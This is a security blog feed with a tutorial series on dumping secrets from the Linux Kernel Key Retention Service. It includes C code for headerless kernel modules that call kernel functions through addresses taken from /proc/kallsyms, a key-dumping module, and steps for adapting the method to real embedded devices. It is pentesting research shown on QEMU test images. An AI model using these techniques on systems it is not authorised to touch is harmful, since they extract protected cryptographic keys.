<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom" xmlns:media="http://search.yahoo.com/mrss/">
    <title>Jesson Soto Ventura</title>
    <link href="https://sotoventura.com/feed.xml" rel="self" />
    <link href="https://sotoventura.com" />
    <updated>2025-05-20T00:19:40-04:00</updated>
    <author>
        <name>Jesson Soto Ventura</name>
    </author>
    <id>https://sotoventura.com</id>

    <entry>
        <title>CackalackyCon 2025</title>
        <author>
            <name>Jesson Soto Ventura</name>
        </author>
        <link href="https://sotoventura.com/cackalackycon.html"/>
        <id>https://sotoventura.com/cackalackycon.html</id>

        <updated>2025-05-20T00:06:51-04:00</updated>
            <summary>
                <![CDATA[
                    CackalackyCon 2025 was great! Thanks to everyone who came to watch my talk. As promised here are various links to the material. - Github Repo with Everything - Slides - Dump Single Key With Headers - Dump all Keys with Headers - Dump all Keys without Headers - Headerless_kernel.py -&hellip;
                ]]>
            </summary>
        <content type="html">
            <![CDATA[
                <p>CackalackyCon 2025 was great! Thanks to everyone who came to watch my talk. As promised here are various links to the material. </p>
<p>- <a href="https://github.com/Jessonsotoventura/linux_kernel_keyring_dumper" target="_blank" rel="noopener">Github Repo with Everything</a></p>
<p>- <a href="https://github.com/Jessonsotoventura/linux_kernel_keyring_dumper/blob/main/Key%20Extraction%20-%20Dumping%20Keys%20From%20the%20Linux%20Kernel%20Key%20Rentention%20Service.pdf">Slides</a> </p>
<p>- <a href="https://github.com/Jessonsotoventura/linux_kernel_keyring_dumper/tree/main/with_headers/single_key_dump" target="_blank" rel="noopener">Dump Single Key With Headers</a></p>
<p>- <a href="https://github.com/Jessonsotoventura/linux_kernel_keyring_dumper/tree/main/with_headers/dump_all_keys" target="_blank" rel="noopener">Dump all Keys with Headers</a></p>
<p>- <a href="https://github.com/Jessonsotoventura/linux_kernel_keyring_dumper/tree/main/without_headers">Dump all Keys without Headers</a></p>
<p><a href="https://github.com/Jessonsotoventura/linux_kernel_keyring_dumper/blob/main/without_headers/headerless_kernel.py">- Headerless_kernel.py </a></p>
<p>- <a href="https://sotoventura.com/dumping-keys-from-the-linux-key-retention-service-part-1.html">Dumping Keys From the Linux Key Retention Service — Part 1</a></p>
<p>- <a href="https://sotoventura.com/dumping-keys-from-the-linux-key-retention-service-part-2.html">Dumping Keys From the Linux Key Retention Service --- Part 2</a></p>
<p> </p>
            ]]>
        </content>
    </entry>
    <entry>
        <title>Dumping Keys From the Linux Key Retention Service --- Part 2</title>
        <author>
            <name>Jesson Soto Ventura</name>
        </author>
        <link href="https://sotoventura.com/dumping-keys-from-the-linux-key-retention-service-part-2.html"/>
        <id>https://sotoventura.com/dumping-keys-from-the-linux-key-retention-service-part-2.html</id>
            <category term="Linux Kernel "/>

        <updated>2024-12-02T00:00:00-05:00</updated>
            <summary>
                <![CDATA[
                    In the last entry of this series we created a Linux kernel module which was able to dump keys from the Linux Kernel Key Retention Service. The kernel module was limited to only x86_64 machines with a mainline Linux kernel. It also required having the appropriate Linux kernel headers. Access&hellip;
                ]]>
            </summary>
        <content type="html">
            <![CDATA[
                <p><a href="https://sotoventura.com/dumping-keys-from-the-linux-key-retention-service-part-1.html">In the last entry of this series</a> we created a Linux kernel module which was able to dump keys from the Linux Kernel Key Retention Service. The kernel module was limited to only x86_64 machines with a mainline Linux kernel. It also required having the appropriate Linux kernel headers. Access to Linux kernel headers is typically not available for embedded systems, making our Linux kernel module useless on most embedded systems. In this blog post, we will fix that by creating a kernel module which will not require any Linux kernel headers. We will also cross-compile the kernel module so that it can run on AArch64 based systems, which tend to be a common architecture for embedded systems.</p><blockquote>
<p>Copied with ❤️ from <a href="https://research.ivision.com/building-linux-kernel-modules-without-headers-part-2.html">ivision’s research blog</a></p></blockquote>
<h2 id="getting-set-up">Getting set up</h2>
<p>If you want to follow along, please download this blog’s resource <a href="/assets/postcontent/headerless_kernel_modules.tar.gz">here</a>. Included in the download are the following two QEMU images:</p><ul>
<li>QEMU x86_64: Based on Linux Kernel 6.6.32</li>
<li>QEMU AArch64: Based on Linux kernel 6.6.32</li>
</ul>
<p>These two images contain all the tools and resources needed for the blog post. Within each image are the following keys:</p><table>
<thead>
<tr>
<th>Key Type</th>
<th>Key Name</th>
<th>Key Value</th>
</tr>
</thead>
<tbody><tr>
<td>user</td>
<td>user_key</td>
<td><code>need pentesting?</code></td>
</tr>
<tr>
<td>logon</td>
<td>logon_key</td>
<td><code>contact us at ivision.com</code></td>
</tr>
<tr>
<td>asymmetric x509</td>
<td>asym_x509</td>
<td>a public certificate</td>
</tr>
<tr>
<td>asymmetric pkcs #8</td>
<td>asym_pkcs8</td>
<td>a private key</td>
</tr>
</tbody></table>
<p>Additionally, the source code for a headerless Linux kernel module is included.</p><h2 id="what-makes-a-linux-kernel-module-valid">What makes a Linux Kernel Module valid</h2>
<p>Our goal is to create a loadable kernel module without using any kernel headers. To achieve that, we will need to convince the Linux kernel that the module supplied is in fact a valid Linux kernel module. This begs the question: “What steps does the Linux Kernel take to validate a Linux kernel module”? Perhaps, if we are able to understand each of these validity checks we will be able to build our own file that that satisfies these checks. These checks are all implemented in the <a href="https://elixir.bootlin.com/linux/v6.6.32/source/kernel/module/main.c#L1669">elf_validity_cache_copy</a> function. A review of the function indicates that it initially performs the following checks on all to-be-loaded modules:</p><ol>
<li>Validation of ELF File Type</li>
<li>Validation of ELF Section Headers</li>
</ol>
<p><strong>Note:</strong> These are not all the checks done by Linux Kernel, however, satisfaction of these two checks is typically enough to let us load our own kernel module. Curious about what all the checks are? <a href="https://elixir.bootlin.com/linux/v6.6.32/source/kernel/module/main.c#L2833">Take a look at the load_module function</a></p><h3 id="validation-of-elf-file-type">Validation of ELF File Type</h3>
<p>The first step in validating a kernel module is validating the kernel module’s file type. A review of the checks performed by the <code>elf_validity_cache_copy</code> method indicates that a Linux kernel module must be an ELF type. Let’s take a closer look at that requirement. The <code>elf_validity_cache_copy</code> function implements the following check:</p><pre><code class="language-c">if (info-&gt;hdr-&gt;e_type != ET_REL) {
        pr_err(&quot;Invalid ELF header type: %u != %u\n&quot;,
               info-&gt;hdr-&gt;e_type, ET_REL);
        goto no_exec;
    }
</code></pre>
<p>This indicates that the ELF type must be of type <code>EL_REL</code> (Relocatable) per the <a href="https://man7.org/linux/man-pages/man5/elf.5.html">elf man page</a>. We can generate ELF relocatable files by using <code>gcc -c</code>. This will create a file, which we can confirm is relocatable via the <code>file</code> command. Actually, let’s make a simple kernel module <code>ivision.c</code> to learn how to meet various Linux kernel module checks.</p><p><strong>Note:</strong> The completed ivision.c file can be found in this blog’s this blog’s resource <a href="/assets/postcontent/headerless_kernel_modules.tar.gz">here</a></p><pre><code class="language-c">int main(){
  return 0;
}
</code></pre>
<p>Let’s compile <code>ivision.c</code> using <code>gcc -c ivision.c -o ivision.ko</code>. Once created, we can use <code>file</code> to confirm that the resulting file <code>ivision.o</code> is of type <code>ELF ... relocatable</code>.</p><pre><code>$ file ivision.o
ivision.o: ELF 64-bit LSB relocatable, x86-64, version 1 (SYSV), not stripped
</code></pre>
<p>For now step one is complete. We have met the file type condition. Up next, we need to modify the ELF so that it fits the Linux Kernel’s ELF section header expectations.</p><h3 id="validation-of-elf-section-headers">Validation of ELF Section Headers</h3>
<p>In addition to validating the kernel module is of the correct ELF type, the <code>elf_validity_cache_copy</code> method checks to see if the kernel module contains specific ELF headers. Specifically, it checks for the following section headers:</p><ul>
<li><code>.modinfo</code></li>
<li><code>.gnu.linkonce.this_module</code></li>
<li>Relocation table for startup and deconstruction functions</li>
<li>For AArch64: <code>.plt</code> and <code>.init.plt</code></li>
</ul>
<p>All ELF files have sections. Some sections are pretty standard (<code>.text</code> for code, <code>.data</code> for data, etc.) but there can be unique sections as well (such as the above). These unique sections are referenced and required by the Linux kernel. So let’s take a look at each of these sections:</p><h4 id="elf-section--modinfo">ELF Section — <code>.modinfo</code></h4>
<p><code>.modinfo</code> is an ELF section containing null-byte separated <code>key=value</code> pairs with module information. Most of the information in this section is not needed, however the following keys/value pairs are important:</p><ul>
<li><code>name</code>: The name of the module. This is what will be used when log messages are printed in any kernel log entries.</li>
<li><code>vermagic</code>: A magic value unique per Linux kernel build which is used by the Linux kernel to validate that the module was built against our specific kernel version.</li>
</ul>
<p>If we want to build a kernel module, we will need to appropriately populate the <code>.modinfo</code> section. To do that, we need to:</p><ol>
<li>Identify the correct <code>vermagic</code>.</li>
<li>Create a new elf section called <code>.modinfo</code>.</li>
<li>Populate <code>.modinfo</code> with the appropriate keys.</li>
</ol>
<p>Let’s start by talking about how to find the <code>vermagic</code>. It is used by the Linux kernel to validate the compatibility of a Linux kernel module, so all Linux kernel modules <strong>must</strong> have the string in their <code>.modinfo</code> section. We can extract the value from an existing Linux kernel module on our test system. Let’s start by finding a suitable module inside our X86_64 QEMU VM:</p><pre><code>$ find / | grep ko
/lib/modules/6.6.32/kernel/drivers/char/hw_random/via-rng.ko
/lib/modules/6.6.32/kernel/drivers/char/hw_random/rng-core.ko
/lib/modules/6.6.32/kernel/drivers/char/hw_random/intel-rng.ko
/lib/modules/6.6.32/kernel/drivers/char/hw_random/virtio-rng.ko
/lib/modules/6.6.32/kernel/drivers/char/hw_random/amd-rng.ko
</code></pre>
<p>Using <code>amd-rng.ko</code>, we can extract the <code>vermagic</code> by copying <code>amd-rng.ko</code> locally and dumping the contents using <code>readelf</code>.</p><pre><code>$ readelf amd-rng.ko -j .modinfo   

Hex dump of section &#39;.modinfo&#39;:
  0x00000000 6c696365 6e73653d 47504c00 64657363 license=GPL.desc
  0x00000010 72697074 696f6e3d 482f5720 524e4720 ription=H/W RNG 
  0x00000020 64726976 65722066 6f722041 4d442063 driver for AMD c
  0x00000030 68697073 65747300 61757468 6f723d54 hipsets.author=T
  0x00000040 6865204c 696e7578 204b6572 6e656c20 he Linux Kernel 
  0x00000050 7465616d 00616c69 61733d70 63693a76 team.alias=pci:v
  0x00000060 30303030 31303232 64303030 30373436 00001022d0000746
  0x00000070 4273762a 73642a62 632a7363 2a692a00 Bsv*sd*bc*sc*i*.
  0x00000080 616c6961 733d7063 693a7630 30303031 alias=pci:v00001
  0x00000090 30323264 30303030 37343433 73762a73 022d00007443sv*s
  0x000000a0 642a6263 2a73632a 692a0064 6570656e d*bc*sc*i*.depen
  0x000000b0 64733d72 6e672d63 6f726500 72657470 ds=rng-core.retp
  0x000000c0 6f6c696e 653d5900 696e7472 65653d59 oline=Y.intree=Y
  0x000000d0 006e616d 653d616d 645f726e 67007665 .name=amd_rng.ve
  0x000000e0 726d6167 69633d36 2e362e33 3220534d rmagic=6.6.32 SM
  0x000000f0 50207072 65656d70 74206d6f 645f756e P preempt mod_un
  0x00000100 6c6f6164 2000                       load .
</code></pre>
<p>We could have also used the following:</p><pre><code>$ strings amd-rng.ko | grep vermagic
vermagic=6.6.32 SMP preempt mod_unload 
</code></pre>
<p>But make sure to compare the output of both commands. Kernel module vermagics can have a trailing space. With the value obtained, let’s talk about how to create the new section header. We can achieve that by using <code>gcc</code>‘s compiler attributes. Specifically, we can use the <code>__attribute__((section(&quot;section_name&quot;)))</code> feature to define where certain variables should be located in the ELF header. Let’s update <code>ivision.c</code> to include a <code>.modinfo</code> section which contains a <code>vermagic</code> and <code>name</code> key.</p><pre><code class="language-c">#define NAME &quot;ivision&quot;
#define VERMAGIC &quot;6.6.32 SMP preempt mod_unload &quot;

char modinfo[]  __attribute__((section(&quot;.modinfo&quot;))) = &quot;name=&quot; NAME &quot;\x00vermagic=&quot; VERMAGIC;

int main(){
  return 0;
}
</code></pre>
<p><strong>Note:</strong> Once again, we can compile our snippet using <code>gcc -c ivision.c -o ivision.ko</code> and the use <code>readelf ivision.ko -j .modinfo</code> to make sure the <code>vermagic</code> and <code>.modinfo</code> section were created.</p><pre><code>$ readelf amd-rng.ko -j .modinfo   

Hex dump of section &#39;.modinfo&#39;:
  0x00000000 6e616d65 3d697669 73696f6e 00766572  name=ivision.ver
  0x00000010 6d616769 633d362e 362e3332 20534d50  magic=6.6.32 SMP
  0x00000020 20707265 656d7074 206d6f64 5f756e6c   preempt mod_unl
  0x00000030 6f616420 00000000 00000000 00000000  oad ............
  0x00000040 00000000 00000000 00000000 00000000  ................
  0x00000050 00000000 00000000 00000000 00000000  ................
  0x00000060 00000000                             ....
</code></pre>
<h4 id="elf-section--gnulinkoncethis_module">ELF Section — <code>.gnu.linkonce.this_module</code></h4>
<p><code>.gnu.linkonce.this_module</code> is an ELF section with a pre-defined size (unique for each kernel) that is used to store the initialized <a href="https://elixir.bootlin.com/linux/v6.6.32/source/include/linux/module.h#L402"><code>struct module</code></a>. This section must be exactly the size of a <code>struct module</code>, which varies depending on the Linux kernel configuration. Except for the module name, this section can typically be filled with zeros and left for the kernel to initialize. Similar to <code>.modinfo</code>, we will need to collect kernel specific information from another Linux kernel module to populate <code>.gnu.linkone.this_module</code>. Specifically, we need to grab:</p><ol>
<li><code>.gnu.linkonce.this_module</code> ELF section size.</li>
<li>The offset where the module name is stored.</li>
<li>The offsets for the startup and deconstruction functions.</li>
</ol>
<p>Let’s start by grabbing the <code>.gnu.linkonce.this_module</code> section size. We can once again use <code>readelf</code> to grab the information. Specifically we can use:</p><pre><code>
$ readelf -S amd-rng.ko -W | grep linkonce_this

  [Nr] Name                      Type            Address          Off    Size   ES Flg Lk Inf Al
  ...
  [26] .gnu.linkonce.this_module PROGBITS        0000000000000000 000900 000440 00  WA  0   0 64
</code></pre>
<p>We’re interested in the hex value (0x440) in the Size column.</p><p>Next we will want to identify, where the module name offset within the <code>.gnu.linkonce.this_module</code> section. We can also use <code>readelf</code> to get that value, except this time we will manually count the offset:</p><pre><code>readelf -j .gnu.linkonce.this_module amd-rng.ko

Hex dump of section &#39;.gnu.linkonce.this_module&#39;:
 NOTE: This section has relocations against it, but these have NOT been applied to this dump.
  0x00000000 00000000 00000000 00000000 00000000 ................
  0x00000010 00000000 00000000 616d645f 726e6700 ........amd_rng.
</code></pre>
<p>Notice that in the above result, the module name (amd_rng) starts at 0x18 and is null terminated.</p><p><strong>Note:</strong> You might remember that <code>.modinfo</code> also contained the module name. However, it is important to note that these two names are used for different operations and can be different. The <code>.modinfo</code> name is used as a tag for log messages and the <code>.gnu.linkonce.this_module</code> name is the actual name of the module and used by utilities like <code>lsmod</code>.</p><p>The final piece of information we need is the startup/deconstruction method offsets. Now these values are not hard-coded in the section header like the name, instead these values are stored as relocation entries. We can once again do that using <code>readelf</code>:</p><pre><code>$ readelf  amd-rng.ko -r 

Relocation section &#39;.rela.text&#39; at offset 0x16f0 contains 15 entries:
  Offset          Info           Type           Sym. Value    Sym. Name + Addend

....

Relocation section &#39;.rela.gnu.linkonce.this_module&#39; at offset 0x2068 contains 2 entries:
  Offset          Info           Type           Sym. Value    Sym. Name + Addend
000000000138  002c00000001 R_X86_64_64       0000000000000010 init_module + 0
0000000003f8  002700000001 R_X86_64_64       0000000000000010 cleanup_module + 0
</code></pre>
<p>Notice that there are two offsets (0x138, 0x3f8) one for the init method (<code>init_module</code>) and one for the cleanup method (<code>cleanup_module</code>).</p><p>So far we’ve collected the following information:</p><ol>
<li><code>.gnu.linkonce.this_module</code> ELF section size: 0x440</li>
<li>The offset where the module name is stored: 0x18</li>
<li>The offsets for the startup and deconstruction functions: 0x138, 0x3f8</li>
</ol>
<p>Let’s update our <code>ivision</code> module to integrate this new information:</p><pre><code class="language-c">#define NAME &quot;ivision&quot;
#define VERMAGIC &quot;6.6.32 SMP preempt mod_unload &quot;
#define GNU_LINK_SIZE 0x440
#define GNU_LINK_NAME_OFFSET 0x18
#define INIT_LOCATION  0x138
#define CLEANUP_LOCATION 0x3f8

char modinfo[100]  __attribute__((section(&quot;.modinfo&quot;))) = &quot;name=&quot; NAME &quot;\x00vermagic=&quot; VERMAGIC;

int init(void){
    return 0;
}

void cleanup(void){
}

int main(){
  return 0;
}


struct module { 
    char __padding[GNU_LINK_NAME_OFFSET];
    char name [sizeof(NAME)];
    char __padding1[INIT_LOCATION-GNU_LINK_NAME_OFFSET-sizeof(NAME)];
    void *init;
    char __padding2[CLEANUP_LOCATION-INIT_LOCATION-sizeof(void*)];
    void *cleanup;
    char __padding3[GNU_LINK_SIZE-CLEANUP_LOCATION-sizeof(void*)];
}__attribute__((packed));

struct module tmp __attribute__ ((section (&quot;.gnu.linkonce.this_module&quot;))) =
{
  .name = NAME,
  .init = init,
  .cleanup = cleanup,
};
</code></pre>
<p><strong>Note:</strong> The <code>init</code> function must return a 0 to indicate a successful <code>init</code>. The <code>cleanup</code> function should not have any return.</p><p>Let’s talk about the changes. We’ve declared a new <code>struct module</code> which contains all the <code>.gnu.linkonce.this_module</code> section information which we want to define. It also uses our offsets to make sure our data is located in the correct locations. We also made use of the <code>__attribute__((packed))</code> feature to make sure that we have full control over the padding and size of the strict. This attribute disables the alignment that the compiler would otherwise perform.</p><p>Additionally, we’ve created two new functions: <code>init</code> and <code>cleanup</code>. These will ultimately be called by our module, but for now they are empty.</p><p>Finally, we define the <code>tmp</code> variable as a new <code>struct module</code> and set up all the necessary values:</p><ul>
<li>Module Name</li>
<li>Init method</li>
<li>Clean up method</li>
</ul>
<p>We also use the <code>section</code> attribute to store the resulting variable in <code>.gnu.linkonce.this_module</code>. With this we’ve almost completed creating our own Linux kernel module from scratch. It would  load now on an x86_64 machine, but it would not do anything.</p><h4 id="elf-section--plt-and-initplt">ELF Section — <code>.plt</code> and <code>.init.plt</code></h4>
<p>One of our goals was make this runnable on AArch64 devices. In order to achieve that, we need to include the <code>.plt</code> and <code>.init.plt</code> ELF section headers. Again, we’ll follow the process of extracting a Linux kernel module from the image, running readelf and copying the results. In this instance, we will use the <code>/lib/modules/6.6.32/kernel/net/802/p8022.ko</code> kernel module from the AArch64 QEMU image. First we will grab the size of the <code>.plt</code> and <code>.init.plt</code> sections:</p><pre><code>$ readelf -S  p8022.ko -W 
There are 25 section headers, starting at offset 0x1078:

Section Headers:
  [Nr] Name              Type            Address          Off    Size   ES Flg Lk Inf Al
  ...
  [ 7] .plt              PROGBITS        0000000000000000 0001d4 000001 00  AX  0   0  1
  [ 8] .init.plt         PROGBITS        0000000000000000 0001d5 000001 00   A  0   0  1
</code></pre>
<p>Based on the results of the above, both section have a size of 0x1. Next, let’s check if that section contains any hard-coded values:</p><pre><code>$ readelf -j .plt -j .init.plt  p8022.ko -W 

Hex dump of section &#39;.plt&#39;:
  0x00000000 00                                  .


Hex dump of section &#39;.init.plt&#39;:
  0x00000000 00        
</code></pre>
<p>Based on the results, it appears that the sections are empty. With this information we can add the following lines to <code>ivision.c</code> to enable it to run on AArch64.</p><pre><code class="language-c">char plt[0x000001] __attribute__ ((section (&quot;.plt&quot;))) __attribute__ ((packed)) = &quot;\x00&quot;;
char init_plt[0x000001] __attribute__ ((section (&quot;.init.plt&quot;))) __attribute__ ((packed)) = &quot;\x00&quot;;
</code></pre>
<p>Now our module, once compiled, could run on both X86_64 and AArch64 architectures. There’s just one problem, it does not do anything.</p><h2 id="calling-kernel-functions">Calling Kernel Functions</h2>
<p>So far, we have a kernel module, but it does not do anything. Let’s modify <code>init</code> to print <code>ivision can help with your pentesting needs</code> and cleanup to print <code>contact us at ivision.com</code>. Typically, we would import <code>printk.h</code> and then call <code>printk</code> to achieve this goal. However, we do not have access to any headers, so we have to take a different approach. We will use function pointers to call functions in the kernel. In order to do that, we’ll need to:</p><ol>
<li>Identify the functions available to us.</li>
<li>Identify their memory address.</li>
<li>Create a function pointer to call the function.</li>
</ol>
<p>We can solve problems 1 and 2 by taking a look at <code>/proc/kallsyms</code>. This file contains all kernel symbols, and it often contains a list of the exported functions and their memory addresses. We are primarily interested in <code>printk</code>, so let’s use look for that symbol:</p><pre><code># grep printk /proc/kallsyms
ffffffff810c1da0 T _printk
</code></pre>
<p><strong>Note:</strong> The above only functions when <code>CONFIG_KALLSYMS_ALL</code> is set to <code>y</code> and when kptr_restrict is set to 0. On real-world devices, you will likely want to run the above as root and hope that <code>CONFIG_KALLSYMS_ALL</code> is enabled. If not, you’ll likely need to find a different way to leak kernel  function addresses.</p><p>You will notice that there is not a <code>printk</code> function, but there is an <code>_printk</code>. This acts just like <code>printk</code>, so we will use it instead. With the symbol identified, we can use <code>C</code>‘s function pointer syntax to call functions at a specific memory address. For <code>_printk</code>, we can create a function pointer using the following</p><pre><code class="language-c">int (*_printk)(const char *) = (void*) 0xffffffff810c1da0;
</code></pre>
<p>For reference, the basic format of a function pointer is:</p><pre><code class="language-c">return_type (*function_name)(param_type_1, param_type_2, ...) = (void *) address;
</code></pre>
<p>Let’s update our <code>ivision.c</code>‘s <code>init</code> and <code>cleanup</code> to call this <code>_printk</code> function:</p><pre><code class="language-c">int init(void){
  (*_printk)(&quot;[INIT] ivision can help with your pentesting needs\n&quot;);
   return 0;
}

void cleanup(void){
  (*_printk)(&quot;[CLEANUP] contact us at ivision.com\n&quot;);
}
</code></pre>
<p>We have now written a Linux kernel module. Let’s talk briefly about compiling. We can compile our code into a kernel module by using <code>gcc -c ivision.c -o ivision.ko</code>. Once compiled, we can load and unload our module using <code>insmod</code> and <code>rmmod</code>. Finally, if we want to build our module for AArch64, we’ll need a bare-metal tool chain. For AArch64, we can get one from ARM <a href="https://developer.arm.com/downloads/-/arm-gnu-toolchain-downloads">here</a> and we will need to adjust the <code>.modinfo</code> and <code>.gnu.module.this_module</code> fields accordingly, but once adjusted we can build it using the toolchain’s prebuilt <code>aarch64-none-elf-gcc</code> binary. This acts just like gcc, but builds for AArch64, thus we only need to run <code>aarch64-none-elf-gcc -c ivision.c -o ivision.ko</code> to get an AArch64 kernel module.</p><p>Now we’ve got a completed kernel module and can load and unload our module:</p><pre><code>$ gcc -c ivision.c -o ivision.ko
$ scp -O -P 2222 ivision.ko root@127.0.0.1:/tmp
$ ssh root@127.0.0.1 -p 2222
# insmod /tmp/ivision.ko
# rmmod /tmp/ivision.ko
# dmesg | grep ivision
ivision: loading module not compiled with retpoline compiler.
ivision: module license &#39;unspecified&#39; taints kernel.
ivision: module license taints kernel.
[INIT] ivision can help with your pentesting needs
[CLEANUP] contact us at ivision.com
</code></pre>
<h2 id="making-the-keydump-module-portable">Making the keydump module portable</h2>
<p>We are almost done here. The final task is to convert our <code>keydump.ko</code> module from the previous blog into something that is usable without Linux kernel headers. That program can be found in this blog’s <a href="/assets/postcontent/headerless_kernel_modules.tar.gz">resources</a>. We will not cover all the code, but let’s talk about some of the highlights:</p><ul>
<li>We had to define <code>struct key</code>. We did not have existing Linux kernel headers to link against, so we had to define our own structure. We didn’t need access to all the members of the struct, so we took a shortcut and ignored any unused members. We took a similar approach for all memory structures, which would typically be included as a header. For the example, the following struct key was created by computing the offsets based on the memory structure documented in <a href="https://elixir.bootlin.com/linux/v6.6.32/source/include/linux/key.h#L195">Linux Kernel’s source code</a>:</li>
</ul>
<pre><code>struct key {
  unsigned long usage;
  unsigned long serial;
  char __padding[152];
  char* description;
  void* payload;
};
</code></pre>
<ul>
<li>The kernel module no longer uses kernel parameters, it now has to be recompiled for every key dump attempt.</li>
</ul>
<p>Once the <code>#defines</code> and function pointers are updated, we can compile it using <code>gcc -c keydump.c -o keydump.ko</code> or <code>aarch64-none-elf-gcc -c ivision.c -o ivision.ko</code> for AArch64, run it using <code>insmod keydump.ko</code>, and remove the module using <code>rmmod keydump.ko</code>. Like before, we will see the results in <code>dmesg</code>:</p><pre><code># dmesg
USER/LOGON - KEY:63 6f 6e 74 61 63 74 20 75 73 20 61 74 20 69 76 69 73 69 6f 6e 2e 63 6f 6d                       contact us at ivision.com
</code></pre>
<h2 id="running-on-real-hardware">Running on real hardware</h2>
<p>This Linux kernel module we wrote works well on QEMU with a mainline kernel. In practice, you might find that its difficult to just compile <code>keydump.c</code> without headers and have it run as intended. Why? Well in the real world, devices use custom kernels with custom configurations. These custom configurations probably will not stop the Linux kernel module from loading, but it will likely crash when attempting to interact with kernel memory. This is on account of the custom configurations potentially altering the data structure used by the Linux Kernel Key Retention Service. We have seen this in real world applications. Custom configurations result in changes to the underlying key structure resulting in kernel panics when invalid memory regions are read. It is a difficult problem to solve, especially when kernel headers are not present. The solution? Staring at the memory dump. The approach we have found to work best has been to:</p><ol>
<li>Determine the Linux kernel version being used and clone its source</li>
<li>Inject your own known key into the kernel keyring (ideally it should match the type of the key you want to extract)</li>
<li>Figure out how to get a reference to a key structure in kernel memory. We have been lucky and the <code>key_lookup</code> function was always present</li>
<li>Dump the memory at the given reference</li>
<li>Compare the Linux kernel source’s key struct to what is in the memory dump</li>
<li>Reconstruct the memory structure enough to recover your known key</li>
<li>Repeat but with your target key</li>
</ol>
<p>Hopefully, this helps if you are looking to dump keys from the Linux Kernel Key Retention service or if you’re trying to figure out how to build stand-alone Linux kernel modules. If you have any questions, feel free to contact me directly at jsotoventura at company name dot com.</p>
            ]]>
        </content>
    </entry>
    <entry>
        <title>Dumping Keys From the Linux Key Retention Service — Part 1</title>
        <author>
            <name>Jesson Soto Ventura</name>
        </author>
        <link href="https://sotoventura.com/dumping-keys-from-the-linux-key-retention-service-part-1.html"/>
        <id>https://sotoventura.com/dumping-keys-from-the-linux-key-retention-service-part-1.html</id>
            <category term="Linux Kernel "/>

        <updated>2024-10-25T00:00:00-04:00</updated>
            <summary>
                <![CDATA[
                    The Kernel Key Retention Service (KKRS) is an in-kernel key management and retention feature, which provided a secure method for storing secrets on Linux systems. With this feature, it is possible for processes to process cryptographic material without having direct access to the key material. Instead, the kernel would handle&hellip;
                ]]>
            </summary>
        <content type="html">
            <![CDATA[
                <p>The Kernel Key Retention Service (KKRS) is an in-kernel <a href="https://man7.org/linux/man-pages/man7/keyrings.7.html"><code>key management and retention</code></a> feature, which provided a secure method for storing secrets on Linux systems. With this feature, it is possible for processes to process cryptographic material without having direct access to the key material. Instead, the kernel would handle all cryptographic operations and key material access. By storing keys in the kernel, typical user-land processes can not retrieve most keys, and it can be challenging for even root to retrieve the most keys.</p><blockquote>
<p>Copied with ❤️ from <a href="https://research.ivision.com/Dumping-Keys-From-the-Linux-Key-Retention-Service-Part-1.html">ivision’s research blog</a></p></blockquote>
<p>This is a huge pain for the security assessment team at ivision! When we assess an embedded system, one of our goals is to recover key material and investigate the downstream threats from an attacker obtaining that key material. The KKRS makes that much more challenging! Which is good, from a defender’s perspective. We recommend that everyone use the KKRS when building embedded systems. But from an attacker’s perspective, recovery of key material stored in the KKRS is difficult. The KKRS was designed to prevent recovery, so attackers must implement a custom key recovery feature. Furthermore, since the KKRS is a Linux kernel feature, the key recovery feature must be implemented as a Linux kernel module. On mainline X86_64 Linux kernels, this is already a challenge but throw in the need to recover key material from embedded systems, which typically lack kernel headers, and it becomes a more difficult challenge to navigate. </p><p>In this two part blog series, we will show how to recover keys from the KKRS. In this first part, we will focus on key recovery from a mainline kernel with access to Linux kernel headers on x86_64. In Part 2, we will cover how to recover keys from a mainline kernel without headers on AArch64. </p><h2 id="getting-set-up">Getting set up</h2>
<p>If you want to follow along, we’ve put together a simple Linux image you can boot in QEMU. You can download that resource and all other mentioned resources <a href="/assets/postcontent/linux_kernel_key_dump.tar.gz">here</a></p><p>It is using the KKRS to store the following keys:</p><table>
<thead>
<tr>
<th>Key Type</th>
<th>Key Name</th>
<th>Key Value</th>
<th>Session Key ID</th>
</tr>
</thead>
<tbody><tr>
<td>user</td>
<td>user_key</td>
<td><code>need pentesting?</code></td>
<td>1011652325</td>
</tr>
<tr>
<td>logon</td>
<td>logon_key</td>
<td><code>contact us at ivision.com</code></td>
<td>171149254</td>
</tr>
<tr>
<td>asymmetric x509</td>
<td>asym_x509</td>
<td>a public key</td>
<td>588852448</td>
</tr>
<tr>
<td>asymmetric pkcs #8</td>
<td>asym_pkcs8</td>
<td>a private key</td>
<td>1033559895</td>
</tr>
</tbody></table>
<p>Once QEMU is running you can run <code>keyctl show</code> to get a list of keys stored in the KKRS.</p><p><strong>Note:</strong> The Key ID values will change for each reboot. We’ll use the following throughout this blog post</p><pre><code># keyctl show
Session Keyring
 850642432 --alswrv      0 65534  keyring: _uid_ses.0
 389366852 --alswrv      0 65534   \_ keyring: _uid.0
 1011652325 --alswrv      0     0       \_ user: user_key
 1033559895 --als--v      0     0       \_ asymmetric: asym_pkcs8
  588852448 --als--v      0     0       \_ asymmetric: asym_x509
  171149254 --alsw-v      0     0       \_ logon: logon:logon_key
</code></pre>
<h2 id="using-the-key-retention-service-basics">Using the Key Retention Service: Basics</h2>
<p>For our purposes we only need to understand enough to retrieve stored key material. In general, KKRS is a keyring or a password manager for the kernel. That means it stores all key material in kernel memory. This is important because it means that key material never touches the disk! It <strong>only</strong> resides in kernel memory. It is up to the system owner to figure out how to get the key into memory securely. When user-space applications want to perform cryptographic operations, they have to ask the kernel, and it will decide how/if the keys can be used. In some cases, the KKRS may return the key material entirely to users, but more commonly, the KKRS will only allow user-space applications to encrypt/decrypt data using keys stored in the kernel. The exact actions allowed depend on the key type.</p><p>All keys stored within the KKRS are assigned a type. The KKRS is built to be extendable, so various types can exist, however, for our cases, we’ll focus on the following key types:</p><table>
<thead>
<tr>
<th>Key Type</th>
<th>Description</th>
<th>Notes</th>
</tr>
</thead>
<tbody><tr>
<td>Keyring</td>
<td>Special key type to hold more keys</td>
<td>None</td>
</tr>
<tr>
<td>User</td>
<td>General purpose key</td>
<td>Contents can be read by user-land processes</td>
</tr>
<tr>
<td>Logon</td>
<td>General purpose key</td>
<td>Contents can not be read</td>
</tr>
<tr>
<td>asymmetric</td>
<td>Supports public-key cryptography</td>
<td>Contents can not be read but can be used for encryption/decryption processes</td>
</tr>
</tbody></table>
